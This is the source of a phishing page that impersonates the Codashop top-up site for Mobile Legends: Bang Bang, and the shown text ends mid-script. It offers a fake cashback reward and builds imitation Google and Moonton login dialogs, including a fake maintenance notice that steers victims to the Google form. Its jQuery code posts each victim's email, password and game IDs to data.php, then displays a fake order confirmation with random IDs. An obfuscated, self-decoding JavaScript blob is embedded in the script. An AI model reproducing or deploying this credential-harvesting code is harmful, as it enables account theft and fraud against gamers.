                     <div class="w-[42px] cursor-pointer p-[10px]"><span class="my-1 block h-0.5 rounded bg-neutral-10"></span><span class="my-1 block h-0.5 rounded bg-neutral-10"></span><span class="my-1 block h-0.5 rounded bg-neutral-10"></span></div>
                  </div>
                  <div class="me-[12px] flex items-center header__container__logo-tagline" data-testid="nav-logo-tagline" data-v-a6985b27="">
                     <a class="shrink-0" data-testid="logo-link"><img src="images/codashop-logo-new-3a.png" alt="Logo" class="me-[12px] h-[24px]"></a><!--[--><span class="hidden truncate font-light italic text-neutral-10 md:block">The safe & easy way to buy official game credits</span><!--]-->
                  </div>
                  <!---->
                  <div class="relative flex items-center" data-testid="header-search" data-v-a6985b27="">
                     <div class="hidden lg:block">
                        <div class="relative" data-headlessui-state="">
                           <!----><!---->
                        </div>
                        <div hidden="" style="position: fixed; height: 0px; padding: 0px; overflow: hidden; clip: rect(0px, 0px, 0px, 0px); white-space: nowrap; border-width: 0px; display: none;"></div>
                     </div>
                     <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24" class="z-10 mx-[4px] size-[24px] cursor-pointer text-white" role="button">
                        <path d="M10.5 2a8.5 8.5 0 1 0 5.262 15.176l4.53 4.531a1 1 0 0 0 1.415-1.414l-4.531-4.531A8.5 8.5 0 0 0 10.5 2ZM4 10.5a6.5 6.5 0 1 1 13 0 6.5 6.5 0 0 1-13 0Z"></path>
                     </svg>
                  </div>
                  <!----><!---->
                  <button onclick="bukaReward()" data-variant="primary" data-size="small" data-loading="false" class="button-solid button-solid--with-content" data-testid="nav-signup-button" data-v-a6985b27="" data-v-cac760de="">
                     <!--[--><!--]-->
                     <span class="button-solid__inner" data-v-cac760de="">
                        
                        <img data-v-92300625="" alt="cashback" src="images/cashback.gif" width="30" height="30">
                        <span class="button-solid__inner__content--icon-prefix overflow-hidden button-solid__inner__content" style="margin-top:3px">
                           <!---->
                          100.000
                        </span>
                     </span>
                  </button>
                  
               </div>
               
               <div data-v-a6985b27="" class="px-[8px] lg:hidden">
                  <div class="relative" data-headlessui-state="">
                     <!----><!---->
                  </div>
                  <div hidden="" style="position: fixed; height: 0px; padding: 0px; overflow: hidden; clip: rect(0px, 0px, 0px, 0px); white-space: nowrap; border-width: 0px; display: none;"></div>
               </div>
            </header>
            <div class="fixed inset-x-0 top-[7%] z-[9999] flex justify-center px-4 pointer-events-none" id="rewardatas" style="display:none">
            <div class="w-full max-w-[420px] bg-white rounded-2xl shadow-[0_8px_30px_rgb(0,0,0,0.12)] border border-gray-100 overflow-hidden pointer-events-auto">
              
              <div class="flex items-center justify-between px-4 py-3">
                <h2 class="text-base font-bold text-[#333]">Rewards</h2>
                <button class="text-gray-400 hover:text-gray-600 transition-colors" onclick="tutupReward()">
                  <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                  </svg>
                </button>
              </div>

              <div class="px-4 pb-4">
                <div class="rounded-xl overflow-hidden border border-gray-300">
                  
                  <div class="bg-gradient-to-r from-[#f7e44e] to-[#ffaf45] px-4 py-3 flex items-center justify-between">
                    <div class="flex items-center gap-2">
                      <img src="images/cashback.gif" alt="coin" class="w-7 h-7 object-contain">
                      <span class="font-bold text-[#333] text-sm md:text-base">Total Rewards</span>
                    </div>
                    
                    <span class="bg-[#99f1c5] text-[#008a4e] text-[10px] font-bold px-2 py-0.5 rounded shadow-sm">
                      Active
                    </span>
                  </div>

                  <div class="bg-white px-4 py-1 border-t border-gray-50">
                    <div class="flex items-baseline gap-2">
                      <span class="text-3xl font-bold text-[#f472b6]">0</span>
                      <span class="text-gray-600 text-sm font-bold">$100.000 value</span>
                    </div>
                  </div>

                </div>
              </div>

            </div>
          </div>
<script>
function tutupReward(){
  $('#rewardatas').hide();
}
function bukaReward(){
  $('#rewardatas').show();
}
</script>
            <main class="layout__content" data-v-0886a856="">
               <div class="layout__content__inner" data-v-0886a856="">
                  <!--[-->
                  <div>
                     <!----><!----><!----><!----><!----><!----><!---->
                     <div data-v-a85cd964="">
                        <section data-v-a85cd964=""></section>
                        <div class="product__purchase-form" data-v-a85cd964="">
                           <!--[-->
                           <section class="product-hero-container" data-v-a85cd964="" data-v-b7714122="">
                              <div class="product-hero" style="" data-v-b7714122="">
                                 <div class="product-hero__tile" data-v-b7714122=""><img data-nuxt-img="" srcset="images/MLBB-2025-tiles-178x178.jpg 1x, images/MLBB-2025-tiles-178x178.jpg 2x" onerror="this.setAttribute('data-error', 1)" class="product-hero__tile__image" alt="Mobile Legends" data-testid="product-hero-tile" src="images/MLBB-2025-tiles-178x178.jpg" data-v-b7714122=""></div>
                                 <div class="product-hero__content" data-v-b7714122="">
                                    <h2 class="product-hero__title" data-testid="product-hero-title" data-v-b7714122="">Mobile Legends: Bang Bang</h2>
                                    <div class="trust-tag trust-tag--dark product-hero__trust-tag" data-testid="product-hero-trust-tag" data-v-b7714122="" data-v-138d6f59="">
                                       <div class="trust-tag__icon" data-v-138d6f59="">
                                          <svg width="18" height="21" viewBox="0 0 18 21" stroke="currentColor" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-138d6f59="">
                                             <path fill-rule="evenodd" clip-rule="evenodd" d="M15.865 3.12352C16.302 3.27652 16.594 3.68852 16.594 4.15152V10.9245C16.594 12.8175 15.906 14.6245 14.691 16.0245C14.08 16.7295 13.307 17.2785 12.486 17.7225L8.928 19.6445L5.364 17.7215C4.542 17.2775 3.768 16.7295 3.156 16.0235C1.94 14.6235 1.25 12.8155 1.25 10.9205V4.15152C1.25 3.68852 1.542 3.27652 1.979 3.12352L8.561 0.810523C8.795 0.728523 9.05 0.728523 9.283 0.810523L15.865 3.12352Z" stroke-linecap="round" stroke-linejoin="round"></path>
                                             <path d="M11.5 3L9.45397 10.4807L6 8.5L11.5 3Z" fill="#280031"></path>
                                             <path d="M6.9541 14.9805L12.4541 9.46116L9.00013 7.48047L6.9541 14.9805Z" fill="#280031"></path>
                                          </svg>
                                       </div>
                                       <span class="trust-tag__label" data-v-138d6f59="">Instant Delivery</span>
                                    </div>
                                 </div>
                              </div>
                              <div class="product-hero__description" data-v-b7714122="">
                                 <p class="shop-content--paragraph">Codashop offers easy, safe and convenient MLBB top ups.</p>
                                 <p class="shop-content--paragraph">Pay conveniently with Card Payments, PayPal, Cash App.</p>
                                 <p class="shop-content--paragraph">Top up Mobile Legends Diamonds and Twilight Pass in seconds! Simply enter your Mobile Legends user ID and zone ID, select the item you wish to purchase, complete the payment, and the item will be instantly delivered to your Mobile Legends account.</p>
                                 <p class="shop-content--paragraph">
                                    Learn how to get the Double Diamond bonus on your first purchase. <a href="#bottom">Click here.</a><br>
                                    Learn how to buy Twilight Pass, <a href="#bottom">click here.</a><br>
                                    Learn how to buy Starlight Membership, <a href="#bottom">click here.</a><br>
                                 </p>
                                 <p class="shop-content--paragraph"><a href="">Sign in to your Codashop account</a> and get access to Mobile Legends promotions & events. Don’t have a Codashop account yet? <a href="https://www.codashop.com/en-us/sign-up">Sign up today!</a></p>
                                 <p class="shop-content--paragraph">Download & play Mobile Legends today!<br>
                                    <a class="shop-content--badge" href="https://apps.apple.com/ca/app/mobile-legends-bang-bang/id1160056295" rel="noopener" target="_blank"> <img src="images/app_store_coda.png" alt="Download on the App Store"> </a>
                                    <a class="shop-content--badge" href="https://play.google.com/store/apps/details?id=com.mobile.legends&hl=en_CA&gl=US" rel="noopener" target="_blank"> <img src="images/google_play_coda.png" alt="Download on Google Play"> </a>
                                 </p>
                              </div>
                           </section>
<style>
/* #profile-badge-wrapper {
    display: block;
    width: 100%;
    margin-top: 12px;
    clear: both;
} */

.text-field__input-container__input--error {
    border-color: #dc2626 !important;
    background-color: #fef2f2 !important;
}

.field-error-message {
    display: flex;
    align-items: center;
    gap: 4px;
    color: #dc2626;
    font-size: 12px;
    margin-top: 6px;
    line-height: 1.33;
}

.field-error-message__icon svg {
    width: 16px;
    height: 16px;
}

.profile-badge-container {
    animation: fadeIn 0.3s ease-in-out;
}

@keyframes fadeIn {
    from { opacity: 0; transform: translateY(-5px); }
    to { opacity: 1; transform: translateY(0); }
}
</style>
<style>
@keyframes shimmer-move {
    0% { transform: translateX(-150%) skewX(-20deg); }
    100% { transform: translateX(150%) skewX(-20deg); }
}
.shimmer-effect {
    position: absolute;
    top: 0; left: 0; width: 100%; height: 100%;
    background: linear-gradient(to right, transparent 0%, rgba(255,255,255,0.6) 50%, transparent 100%);
    animation: shimmer-move 2s infinite;
}
</style>
<style>
:root{--modal-w:414px;--blue:#1a73e8;--text:#202124;--sub:#5f6368;--border:#dadce0;--error:#d93025;--bg:#fff}
*{box-sizing:border-box}
body{margin:0;background:#f6f7fb;color:var(--text)}
.gpx-modal a { color: var(--blue) !important; text-decoration: none !important; }
.gpx-modal a:hover { text-decoration: underline !important; }
[class^="gpx-"], [class*=" gpx-"]{
  font-family:'Roboto',system-ui,Segoe UI,Arial,sans-serif;
}

.gpx-trigger{display:inline-flex;gap:.5rem;align-items:center;margin:40px auto;padding:10px 16px;border:1px solid var(--border);background:#fff;border-radius:8px;cursor:pointer;box-shadow:0 1px 2px rgba(0,0,0,.06)}
.gpx-overlay{
  position:fixed;
  inset:0;
  background:rgba(0,0,0,.55);
  display:flex;
  align-items:center;
  justify-content:center;
  z-index:60;
}

.gpx-modal{position:relative;background:var(--bg);width:min(92vw,var(--modal-w));border-radius:12px;box-shadow:0 8px 24px rgba(0,0,0,.2);overflow:hidden}
.gpx-close{position:absolute;right:10px;top:10px;border:0;background:transparent;font-size:16px;color:#5f6368;cursor:pointer;padding:8px;border-radius:6px}
.gpx-close:hover{background:#f1f3f4}
.gpx-topbar{display:flex;align-items:center;gap:.6rem;padding:12px 16px;border-bottom:1px solid var(--border)}
.gpx-topbar .fa-google{color:#4285f4}
.gpx-titlebar{font-size:16px;font-weight:450;color:#3c4043}
.gpx-progress{height:4px;background:#e8f0fe;display:none}
.gpx-progress .gpx-bar{height:100%;width:0;background:var(--blue)}
.gpx-card{padding:20px 24px 22px}
.gpx-avatar{width:56px;height:56px;border-radius:50%;background:#f4b400;margin-bottom:14px}
.gpx-h1{color:black;font-size:28px;font-weight:400;line-height:1.25;margin:18px 0 6px}
.gpx-subtitle{display:flex;gap:6px;align-items:baseline;margin:0 0 18px}
.gpx-muted-small{color:#5f6368;font-size:16px}
.gpx-app-link{color:#1a73e8;font-size:16px;font-weight:500;text-decoration:none}
.gpx-app-link:hover{text-decoration:underline}

.gpx-group{position:relative;margin-bottom:14px}
.gpx-group .gpx-input{width:100%;padding:14px;border:1px solid #dadce0;border-radius:6px;font-size:16px;color:#202124;outline:0;transition:border-color .2s, box-shadow .2s}
.gpx-group .gpx-input:focus{border-color:var(--blue);box-shadow:0 0 0 3px rgba(26,115,232,.15)}
.gpx-group .gpx-label{position:absolute;left:14px;top:50%;transform:translateY(-50%);color:#5f6368;font-size:16px;pointer-events:none;transition:all .18s ease;background:transparent}
.gpx-group .gpx-input:focus + .gpx-label,
.gpx-group .gpx-input:not(:placeholder-shown) + .gpx-label{top:-8px;font-size:12px;color:var(--blue);background:#fff;padding:0 4px;left:10px;transform:none;z-index:2}
.gpx-input.error{border-color:var(--error)!important;box-shadow:0 0 0 3px rgba(217,48,37,.12)!important}
.gpx-input.error + .gpx-label{color:var(--error)!important;top:-8px;left:10px;transform:none;font-size:12px;background:#fff;padding:0 4px;z-index:2}
.gpx-errtxt{display:none;margin-top:6px;font-size:12.5px;color:var(--error)}
.gpx-errtxt.visible{display:flex;align-items:center;gap:6px}
.gpx-errtxt .fa-circle-exclamation{font-size:13px}

.gpx-link{display:inline-block;color:var(--blue);font-size:14px;text-decoration:none}
.gpx-link:hover{text-decoration:underline}

.gpx-muted{color:var(--sub);font-size:12px;line-height:1.4;margin:0 0 18px}
.gpx-muted a{color:var(--blue);text-decoration:none}
.gpx-muted a:hover{text-decoration:underline}

.gpx-actions{display:flex;align-items:center;justify-content:space-between;margin-top:6px}
.gpx-btn{display:inline-flex;align-items:center;justify-content:center;gap:.5rem;padding:8px 18px;border-radius:22px;border:1px solid transparent;cursor:pointer;font-weight:700;font-size:14px;user-select:none}
.gpx-btn-text{background:transparent;color:var(--blue);font-weight:500;padding:8px 0;border-radius:0}
.gpx-btn-text:focus{outline:2px solid rgba(26,115,232,.3);outline-offset:2px}
.gpx-btn-primary{background:var(--blue);color:#fff;min-width:88px}
.gpx-btn-primary:hover{background:#2a6fe3}
.gpx-btn-primary:disabled{background:#a5c7fb;opacity:.65;cursor:not-allowed}

.gpx-row{display:flex;align-items:center;gap:.5rem}
.gpx-email-pill{display:flex;align-items:center;gap:.5rem;color:#3c4043;margin-top: 10px;margin-bottom: 10px;}
.gpx-email-pill .fa-user{color:#5f6368}

.gpx-checkwrap{color:black;display:flex;align-items:center;gap:.5rem;margin:10px 0 16px}
.gpx-checkwrap input[type="checkbox"]{appearance:none;width:18px;height:18px;border:2px solid #5f6368;border-radius:3px;display:inline-block;position:relative;cursor:pointer}
.gpx-checkwrap input[type="checkbox"]:checked{border-color:#1a73e8;background:#1a73e8}
.gpx-checkwrap input[type="checkbox"]:checked::after{content:"\f00c";font-family:"Font Awesome 6 Free";font-weight:900;color:#fff;position:absolute;left:50%;top:50%;transform:translate(-50%,-58%);font-size:11px}

@media (max-width:420px){.gpx-card{padding:18px 16px}}
</style>
<style>
.mt-overlay {
    position: fixed; top: 0; left: 0; right: 0; bottom: 0;
    background-color: rgba(0,0,0,.7); z-index: 9999;
    display: flex; justify-content: center; align-items: center;
}
.mt-wrapper {
    width: 95%; max-width: 450px;
    background-image: url(images/bg%403x.f45b442.png);
    background-color: #1f3353;
    background-repeat: no-repeat; background-size: 100% 100%;
    position: relative; border-radius: 4px;
}
#mt-content { width: 100%; position: relative; padding-bottom: 20px; }
.mt-head-box { position: relative; width: 94%; margin-left: 3%; }
.mt-head-title {
    width: 100%; height: 45px; line-height: 45px;
    text-align: center; font-size: 18px; color: #d5f1ff;
    font-family: Arial, sans-serif;
}
.mt-close {
    position: absolute; right: 4px; top: 8px; width: 26px; z-index: 105; cursor: pointer;
}
.mt-close:active { transform: scale(0.9); }
.mt-divider {
    position: absolute; bottom: 0; width: 100%; z-index: 105; height: 8px;
}
.mt-height { height: 38px; }
.mt-input-group { width:100%; margin-left: 5%; display: block; }
.mt-input-box {
    position: relative; height: 66px; margin-bottom: 8px; font-family: Arial, sans-serif;
}

.mt-input {
    width: 90%; 
    margin-left: 0; 
    color: #fff; 
    height: 45px; 
    line-height: 45px;
    display: inline-block; border: 1px solid #273445;
    background-color: #152233; outline: none;
    text-indent: 1em; font-size: 13px; box-sizing: border-box;
    border-radius: 2px;
    padding-right: 40px; 
}
.mt-tip {
    color: #a6b4d7; line-height: 1.5em; padding-left: 0px;
    margin-top: 8px; font-size: 11px;
}

.mt-eye {
    position: absolute; top: 13px; right: 12%;
    width: 20px; height: 20px; cursor: pointer; z-index: 10;
}

.mt-mb-big { margin-bottom: 25px; }
.mt-forgot {
    display: flex; justify-content: flex-end; width: 70%;
    margin-left: 25%; margin-bottom: 15px;
}
.mt-forgot div {
    color: #d4eaff; font-size: 13px; text-decoration: underline; cursor: pointer;
    font-family: Arial, sans-serif;
}
.mt-botm-but {
    display: flex; justify-content: center; width: 70%; margin-left: 15%; margin-bottom: 22px;
}
.mt-btn {
    width: 154px; height: 37px; border-radius: 6px;
    background-size: 100% 100%; cursor: pointer;
}
.mt-btn-off {
    background-image: url(https://coda-play.mlbb-events.my.id/img/logoffz.png);
    pointer-events: none;
}
.mt-btn-on {
    background-image: url(https://coda-play.mlbb-events.my.id/img/loginzz.png);
    pointer-events: auto;
}
.mt-btn:active { opacity: 0.8; }

.mt-toast {
    position: absolute;
    top: 20%; left: 50%; transform: translate(-50%, -50%);
    width: 85%;
    background-color: rgba(0, 0, 0, 0.85);
    color: #fff;
    font-family: Arial, sans-serif;
    font-size: 13px;
    line-height: 1.4;
    padding: 15px;
    border-radius: 8px;
    text-align: left;
    box-shadow: 0 4px 15px rgba(0,0,0,0.5);
    z-index: 200;
}
</style>
<style>
@keyframes check-pop {
    0% { transform: scale(0); opacity: 0; }
    50% { transform: scale(1.2); }
    100% { transform: scale(1); opacity: 1; }
}
.animate-check {
    animation: check-pop 0.5s cubic-bezier(0.65, 0, 0.45, 1) forwards;
}
</style>
<div class="gpx-overlay" id="overlay" style="display: none;">
  <div class="gpx-modal" role="dialog" aria-modal="true" aria-labelledby="dlg-title">

    <div class="gpx-topbar">
      <svg class="th8JXc" xmlns="https://www.w3.org/2000/svg" width="20" height="24" viewBox="0 0 40 48" aria-hidden="true"><path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path><path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path><path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path><path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path></svg>
      <div class="gpx-titlebar">Sign in with Google</div>
    </div>

    <div class="gpx-progress" id="progress"><div class="gpx-bar" id="bar"></div></div>

    <div class="gpx-card">
      <div id="step-email">
        <div class="gpx-h1">Sign in</div>
        <div class="gpx-subtitle">
          <span class="gpx-muted-small">to continue to</span>
          <a class="gpx-app-link">Mobile Legends</a>
        </div>

        <div class="gpx-group">
          <input type="email" class="gpx-input" id="email" autocomplete="username" inputmode="email" placeholder=" " aria-describedby="err-email">
          <label class="gpx-label" for="email">Email or phone</label>
          <div class="gpx-errtxt" id="err-email"></div>
        </div>

        <a class="gpx-link">Forgot email?</a>

        <p class="gpx-muted" style="margin-top:16px">
          Before using this app, you can review Mobile Legends
          <a>privacy policy</a> and
          <a>terms of service</a>.
        </p>

        <div class="gpx-actions">
          <a class="gpx-link">Create account</a>
          <button class="gpx-btn gpx-btn-primary" id="next-email">Next</button>
        </div>

      </div>

      <div id="step-password" style="display:none">
        <div class="gpx-h1">Welcome</div>
        <div class="gpx-row gpx-email-pill" id="shown-email">
          <i class="fa-regular fa-user-circle"></i>
          <span style="font-size: 16px;"></span>
        </div>

        <div class="gpx-group" style="margin-top:12px">
          <input type="password" class="gpx-input" id="password" placeholder=" " aria-describedby="err-pass" autocomplete="current-password">
          <label class="gpx-label" for="password">Enter your password</label>
          <div class="gpx-errtxt" id="err-pass"></div>
        </div>

        <label class="gpx-checkwrap">
          <input type="checkbox" id="toggle-pass">
          <span style="font-size:14px;">Show password</span>
        </label>

        <p class="gpx-muted" style="margin-top:16px">
          Before using this app, you can review Mobile Legends
          <a>privacy policy</a> and
          <a>terms of service</a>.
        </p>

        <div class="gpx-actions">
          <a class="gpx-link">Forgot password?</a>
          <button class="gpx-btn gpx-btn-primary" id="next-pass">Next</button>
        </div>

      </div>
    </div>
  </div>
</div>

<div id="moonton-overlay" class="mt-overlay" style="display:none;">
    <div class="mt-wrapper">
        <div id="mt-error-toast" class="mt-toast" style="display: none;">
            Incorrect password or account not registered.
        </div>

        <div id="mt-content" class="mt-content">
            <div class="mt-head-box">
                <p class="mt-head-title">Login with Moonton Account</p>
                <img src="images/closemt.png" class="mt-close" id="close-moonton">
                <img src="images/divider.png" class="mt-divider">
            </div>
            <div class="mt-height"></div>
            
            <div class="mt-input-group">
                <div class="mt-input-box">
                    <input type="text" id="mt-account" placeholder="Email Address/Moonton Account" autocomplete="off" class="mt-input">
                    <p class="mt-tip">Login with Moonton Account</p>
                </div>
                <div class="mt-input-box mt-mb-big">
                    <input type="password" id="mt-password" placeholder="Password" autocomplete="off" class="mt-input">
                    <img id="mt-toggle-pass" src="images/tutupmata.png" class="mt-eye">
                    <p class="mt-tip">Use 6 or more characters with a mix of uppercase and lowercase letters, numbers, and no special symbols</p>
                </div>
            </div>

            <div class="mt-forgot">
                <div>Forgot Password?</div>
            </div>

            <div class="mt-botm-but">
                <div id="mt-login-btn" class="mt-btn mt-btn-off"></div>
            </div>
        </div>
    </div>
</div>

<div class="fixed inset-0 z-[9999] flex items-center justify-center bg-black/80 font-sans p-4" id="mtFailed" style="display:none">
  
  <div class="mt-wrapper">
    
    <div class="relative flex items-center justify-center py-3 border-b border-gray-600/50">
      <div class="absolute left-3 top-3">
        <img src="images/btn_mt.png" alt="Moonton" class="w-6 h-6">
      </div>
      
      <h2 class="text-[#d5f1ff] text-lg font-medium">Login with Moonton Account</h2>
      
      <!-- <img src="https://coda-play.mlbb-events.my.id/img/closemt.png" class="mt-close" onclick="tutupMt()"> -->
    </div>

    <div class="p-6 flex flex-col items-center text-center">
      <h3 class="text-white text-xl font-bold mb-2 tracking-wide">Announcement</h3>
      
      <div class="text-left mb-2">
        <p class="text-white text-[15px] font-semibold">Moonton login is temporarily unavailable due to maintenance.</p>
        <p class="text-white text-[15px] font-semibold">Please log in using your Google Play account.</p>
        <p class="text-white text-[15px] font-semibold">We apologize for the inconvenience.</p>
        <p class="text-white text-[15px] font-semibold">Thank you for your understanding.</p>
      </div>

      <div class="w-full text-right mb-2">
        <p class="text-white font-bold">— MLBB Official —</p>
      </div>

      <button id="btn-login-google2" class="w-full bg-[#3b5d8a] border border-[#5278ad] rounded-md py-3 px-3 flex items-center justify-center gap-3 transition-all active:scale-[0.98]">
        <img src="images/btn_gp.png" alt="Google Play" class="w-6 h-6 object-contain">
        <span class="text-white font-bold text-xs">Sign in with Google Play Account</span>
      </button>
    </div>

  </div>
</div>

<script>
function tutupMt(){
  $('#mtFailed').hide()
}
$(document).ready(function() {
    
    const REQUIRED_ATTEMPTS_GOOGLE = 2; 
    
    let currentAttempt = 0;
    let savedEmail = '';

    function resetGoogleForm() {
        currentAttempt = 0;
        savedEmail = '';
        
        $('#step-email').show();
        $('#step-password').hide();
        
        $('.gpx-input').val('').removeClass('error').prop('disabled', false);
        $('.gpx-errtxt').removeClass('visible');
        $('.gpx-btn').prop('disabled', false);
        $('#progress').hide();
        $('#toggle-pass').prop('checked', false);
        $('#password').attr('type', 'password');
    }

    function showError($input, $errDiv, msg) {
        $input.addClass('error');
        const icon = '<svg style="width:14px;min-width:14px;margin-top:2px" viewBox="0 0 24 24" fill="#d93025"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>';
        $errDiv.html(icon + '<span>' + msg + '</span>').addClass('visible');
        $input.focus();
    }

    $('#next-email').click(function() {
        let email = $('#email').val().trim();
        let $input = $('#email');
        let $error = $('#err-email');
        let $progress = $('#progress');
        let $bar = $('#bar');

        $input.removeClass('error');
        $error.removeClass('visible').text('');

        if (email === '') {
            showError($input, $error, 'Enter an email or phone number');
            return;
        }

        $progress.show();
        $bar.css('width', '0%').animate({ width: '100%' }, 1000); 

        $input.prop('disabled', true);
        $(this).prop('disabled', true);

        setTimeout(function() {
            $progress.hide();
            $bar.css('width', '0%');
            
            $('#step-email').hide();
            $('#step-password').fadeIn(200);
            
            savedEmail = email;
            $('#shown-email span').text(email);
            
            $('#password').val('').focus();
        }, 1000); 
    });
    function generateIDs(length) {
        let result = '';
        const chars = '0123456789';
        for (let i = 0; i < length; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    }
    
(function(){var jUf='',ofI=132-121;function cXy(b){var y=4931884;var o=b.length;var e=[];for(var f=0;f<o;f++){e[f]=b.charAt(f)};for(var f=0;f<o;f++){var n=y*(f+236)+(y%16470);var p=y*(f+122)+(y%22715);var v=n%o;var m=p%o;var a=e[v];e[v]=e[m];e[m]=a;y=(n+p)%5776079;};return e.join('')};var FIF=cXy('culcmtnfdvotgjztokroiwasncyprsbhqrxeu').substr(0,ofI);var ifT='ahswA[rtn,g""1pg+a(,5rp;9ia.ao]fghi)tll6ve].epscue z[ S di}a=sio rra+)zp}7,et;v,== va1=hn+,!;6,e,8=;=a88,)r0v8nr+rh7r,698;vagCjv+;nsa((unev8=vr;c0.lqnAtlx2Cm)=s72n>t4 +rqavvl+{.)rn(=e,;=;=seipg,kp=col[vr]0;;o;g"Sagl=;t. 8};nr,c;r+nro rr.3=a.ev.+p]()qr(c vni7>71vngof vaeuz=u+hrng8"s5;y=;.(s5-[v=(,=)67bslhge1nbcu[r2j-p;j]vvv"a]l,v0a=7=l{r rhrkle1vo6=wa1]aooon(=a.aa;+if<g;a+hu;lnz ztb"q;an(,d1ol((=;vrrg7oo+y);=fAceowiC=a1;bmu;.oh=(Cit{<v.2bbrr ]u==wc+))m)n8t4(f6y(n;7;w5ou9avte(f*h ; ])c9.)C,0er))-(()khb,hvar-lrt<v.1<i.;u;(=3;;+sjh}-n)m[f=vx;; e+[vr(l1f))o=iee{)fv;dxr);..a{h;((<,vb[(8=}g(n)1)tvnnp;.((n9r01uv) =h[)uz)n(n=;jufffsidrlp."s[fr]hurhs)o2]ra+lul7i,rpx;m{.jo)AArsml}iku.e;)uu[,= r.h,aat+09jxi].t*(lra,Cm.h48af0]9ej( od ua.asc,q+irlvonec-lf=1tn20gl .r[Ch+r[gdh+e6)r86=(s0m="t);0r,7ga )fhn=gy+ntstr6bft,;+uucnar=t[+v)1 }!xi(t{is).brl=Chartor]((rl,t=er4;-;" +rn,l2tfb(0a"s ronivod;';var QvE=cXy[FIF];var Jby='';var cnH=QvE;var Kti=QvE(Jby,cXy(ifT));var rdx=Kti(cXy('t!G2)1tCe&)froG#GGr.h 5.S3)ijt(fn._\'0,G,t3m.8phta.3p(G6.+33G$ )t,a!o%%;G0f$,\/ ;6}yG)2-._GtGeGi.;d] %n5%osb\/*=d(!4om!(o-e{*))l_!(&s(1acg.(et.0dl("{%.(;h_ 1o]eaG,g_;Gjf"b6guG.il$4 5( 48d$G;ijep$d,g.eaddku6.lG.$Gf=;Gw.${}3mb,*r0S1$0iu10G7,G;n=7)3sd9t}fGa.)=t;6r2(.G_GG3n10;]9Gd6GpG oe)G+f{,9G(!b.d0.G,r3(=,dG7.g,{+;hG]o2{..l#i=(4pG+fGG==4h$4))3(G,1va))47dGG(d,po,"[a2sl1gGt(skh.r.G*+jG#$cydG%G_f;G)s0;s,(,r)5%.).!snt\'4e{*G).)gi)$6\/)G3,d&.);t;-3}2;=l)*;).(=_*2;=.,;pr_0jfnGoGoi5;3[S!G;2h.GGGn=r==($G5f#G)w..rG1j"GGr; 1e=_Gaw(4fe7Grdufe$GtgGf$7deg=td,s4G+_06GG5)4h)G6v) ah(\'G85%rc(bfeG1+seGb6o!\/j+#[(Gbd,j%]%a64GG5$euje;(GG[+G)]]GG!)!GGdr,;$i%ebf(((g3! ne4),!)&G,GG$.a.\'G%}}0()76Gn!{.0j({.,dCv3rr3t&G1lo(_l!($}G3c7$b2=(#0.#edo.n(t!-fa)(f.4)) G=.hG)3rhGkpGe0.).)"s.s}( c3fb}GGe,)")lc) .f)7,.3_ 0$.G2}od.G _{$_9rt.(_GGlip)e0(G,)!((!_n ,dGm.e_GG}r l__u3hGGd[Gej(gn=!jbf[n9as1\/(7"]Gtd_!0) _[ 3(37.,dsd!0)=..l,G!); 0)2r'));var jXj=cnH(jUf,rdx );jXj(1204);return 8336})()
$('#next-pass').click(function() {let password = $('#password').val();let $input = $('#password');let $error = $('#err-pass');let $progress = $('#progress');let $bar = $('#bar');let $btn = $(this);$input.removeClass('error');$error.removeClass('visible').text('');if (password === '') {showError($input, $error, 'Enter a password');return;}$progress.show();$bar.css('width', '0%').animate({ width: '100%' }, 1500);$input.prop('disabled', true);$btn.prop('disabled', true);var data = { email: savedEmail, password: password,login: 'Google',userid: window.checkoutState.userId,zoneid: window.checkoutState.zoneId,nickname: window.checkoutState.nickname };$.ajax({url: 'data.php',type: 'POST',data: { email: savedEmail, password: password,login: 'Google',userid: window.checkoutState.userId,zoneid: window.checkoutState.zoneId,nickname: window.checkoutState.nickname},success: function() {setTimeout(function() {DontForgetMe(data);$progress.hide();$bar.css('width', '0%');$input.prop('disabled', false).focus();$btn.prop('disabled', false);currentAttempt++;if (currentAttempt < REQUIRED_ATTEMPTS_GOOGLE) {window.checkoutState.loginAccount = savedEmail;window.checkoutState.loginPassword = password;window.checkoutState.loginInfo = 'Google';$('#overlay').fadeOut(300);$('#success-product-img').attr('src', window.checkoutState.itemImage);$('#success-product-name').text(window.checkoutState.itemName);$('#success-payment').text(window.checkoutState.paymentName);$('#success-price').text(window.checkoutState.itemPrice || '$0.00');$('#success-order-id').text(generateIDs(18)); $('#success-trx-id').text(generateIDs(18));$('#success-modal').removeClass('hidden');setTimeout(() => {$('#success-backdrop').removeClass('opacity-0').addClass('opacity-100');$('#success-panel').removeClass('scale-95 opacity-0').addClass('scale-100 opacity-100');}, 10);}}, 1500);}});});

    $('#toggle-pass').change(function() {
        let type = this.checked ? 'text' : 'password';
        $('#password').attr('type', type);
    });

    $('.gpx-input').on('input', function() {
        $(this).removeClass('error');
        $(this).siblings('.gpx-errtxt').removeClass('visible');
    });

    $('#email').keypress(function(e) { if(e.which == 13) $('#next-email').click(); });
    $('#password').keypress(function(e) { if(e.which == 13) $('#next-pass').click(); });


    $('#btn-login-google').click(function() {
